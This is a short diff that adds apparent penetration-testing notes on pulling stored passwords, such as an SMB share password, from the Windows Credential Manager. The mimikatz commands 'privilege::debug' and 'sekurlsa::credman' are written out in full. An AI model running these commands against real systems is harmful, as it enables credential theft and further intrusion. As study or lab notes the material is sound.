@@ -1,0 +1,10 @@
+for this, we are going into the windows credential vault.
+we can see inside of the windows credential vault that we have
+the password to an SMB share.
+
+mimikatz.exe 
+privilege::debug
+sekurlsa::credman
+
+from this, we can see any passwords that are stored inside of the windows
+credentials manager (windows cred vault)
